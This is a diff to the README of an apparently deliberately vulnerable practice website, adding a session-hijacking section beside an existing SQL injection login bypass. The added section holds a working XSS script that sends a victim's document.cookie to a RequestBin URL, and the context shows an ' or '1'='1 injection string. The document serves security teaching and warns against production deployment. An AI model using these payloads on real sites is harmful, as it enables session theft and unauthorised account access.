@@ -68,6 +68,17 @@ It's possible to bypass login completely (logging in as whoever you like) by add
 foo' or '1'='1
 ```
 
+### Session Hijacking (XSS)
+Using a service like [RequestBin](https://requestb.in/) it's possible to hijack user sessions by capturing their session cookie. Try sending a message to a user consisting of the following code (with `{{ bin_id }}` substituted out for your RequestBin bin ID).
+
+```html
+<script>
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open("GET", "https://requestb.in/{{ bin_id }}?c=" + document.cookie, false);
+    xmlHttp.send(null);
+</script>
+```
+
 ## Warnings
 This site is intentionally left vulnerable to common exploits. Don't host it on the same server as any production sites, only ever deploy it on a machine that you wouldn't mind bricking (I recommend a disposable VM).
 
